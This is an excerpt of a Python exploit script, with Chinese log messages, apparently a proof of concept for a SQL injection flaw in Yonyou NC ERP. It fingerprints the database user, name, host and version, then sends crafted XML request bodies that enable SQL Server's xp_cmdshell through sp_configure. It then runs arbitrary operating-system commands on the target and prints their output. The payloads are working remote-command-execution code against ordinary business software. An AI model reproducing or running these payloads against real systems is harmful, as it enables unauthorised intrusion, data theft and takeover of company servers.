...
def POC_1(target_url):
    ...
    if target_url[-1] != '/':
        target_url += '/'
    print(now_time() + ' [INFO]     正在检测是否存在用友NC_ERP注入漏洞')
    ...
    try:
        ...
        if row_1 in response.text and "服务器错误信息：null" not in response.text:
            ...
            print(now_time() + " [SUCCESS]  该系统存在SQL漏洞，漏洞响应为:")
            print(now_time() + " [INFO]     >> 数据库用户为:{}".format(db_user))
            print(now_time() + " [INFO]     >> 数据库名为:{}".format(db_name))
            print(now_time() + " [INFO]     >> 数据库主机名为:{}".format(db_host))
            print(now_time() + " [INFO]     >> 数据库版本为:{}".format(db_vers))
            print(now_time() + " [INFO]     该漏洞有可能可执行命令，请到移步到poc/用友NC_ERP注入漏洞.py进行检查确认\n")
            return db_name
        else:
...
def xp_cmdshell_open(target_url, db_name):
    open_sql = ["use {}".format(db_name), "exec sp_configure 'show advanced options',1", "reconfigure",
    ...
    for sql in open_sql:
        ...
        data = 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">{}</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'.format(
            sql)
        try:
            print(now_time() + " [INFO]     正在执行SQL语句:{}".format(sql))
            ...
            print(now_time() + " [INFO]     开启 xp_cmdsheall 失败")
            sys.exit(0)
...
def POC_3(target_url, cmd):
    ...
    data = 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell "{}"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'.format(
        cmd)
    try:
        print(now_time() + " [INFO]     正在执行SQL语句:exec xp_cmdshell '{}'".format(cmd))
        response = requests.post(url=vuln_url, headers=headers, data=data, timeout=20)

        data = re.findall(r'output="(.*?)"', response.text)
        for i in data:
            print(now_time() + " [INFO]     >>> ".format(i))
    except Exception as e:
        print(now_time() + " [INFO]     请求失败:{} ".format(e))
        sys.exit(0)
